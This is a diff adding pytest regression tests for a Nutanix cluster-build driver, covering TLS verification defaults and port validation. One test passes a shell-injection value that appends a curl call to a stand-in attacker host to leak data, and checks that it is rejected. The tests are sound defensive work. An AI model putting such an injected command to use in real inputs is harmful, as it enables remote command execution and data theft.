@@ -69,6 +69,56 @@ def test_unknown_infra_target_raises():
         driver_for("openstack")
 
 
+# -- security-pass regression: TLS verification must default to on ----------
+
+
+def test_prism_central_client_verifies_tls_by_default():
+    """Basic Auth carries the Prism Central credentials on every request --
+    certificate verification must default to *on* so a profile that forgets
+    to set `verify_tls` doesn't silently expose credentials to a MITM."""
+    from clusterbuild.core.drivers.nutanix import NutanixCredentials, _PrismCentralClient
+
+    profile = {"prism_central": {"endpoint": "prism-central.lab.example.com"}}  # no verify_tls key
+    client = _PrismCentralClient(profile, NutanixCredentials(username="admin", password="pw"))
+    assert client.session.verify is True
+
+
+def test_prism_central_client_honors_explicit_verify_tls_false():
+    from clusterbuild.core.drivers.nutanix import NutanixCredentials, _PrismCentralClient
+
+    profile = {"prism_central": {"endpoint": "prism-central.lab.example.com", "verify_tls": False}}
+    client = _PrismCentralClient(profile, NutanixCredentials(username="admin", password="pw"))
+    assert client.session.verify is False
+
+
+# -- security-pass regression: bastion_http_port must be a validated int,
+# not free text interpolated straight into a remote shell command ----------
+
+
+def test_resolve_bastion_http_port_defaults_and_accepts_valid_port():
+    from clusterbuild.core.drivers.nutanix import _resolve_bastion_http_port
+
+    assert _resolve_bastion_http_port({}) == 8081
+    assert _resolve_bastion_http_port({"bastion_http_port": 9999}) == 9999
+    assert _resolve_bastion_http_port({"bastion_http_port": "9999"}) == 9999
+
+
+def test_resolve_bastion_http_port_rejects_shell_injection_payload():
+    from clusterbuild.core.drivers.nutanix import NutanixDriverError, _resolve_bastion_http_port
+
+    with pytest.raises(NutanixDriverError, match="must be an integer"):
+        _resolve_bastion_http_port({"bastion_http_port": "8081; curl https://attacker.example/leak"})
+
+
+def test_resolve_bastion_http_port_rejects_out_of_range_values():
+    from clusterbuild.core.drivers.nutanix import NutanixDriverError, _resolve_bastion_http_port
+
+    with pytest.raises(NutanixDriverError, match="between 1 and 65535"):
+        _resolve_bastion_http_port({"bastion_http_port": 0})
+    with pytest.raises(NutanixDriverError, match="between 1 and 65535"):
+        _resolve_bastion_http_port({"bastion_http_port": 70000})
+
+
 # -- agent.py reused, unmodified, against the Nutanix driver -----------------
 
 
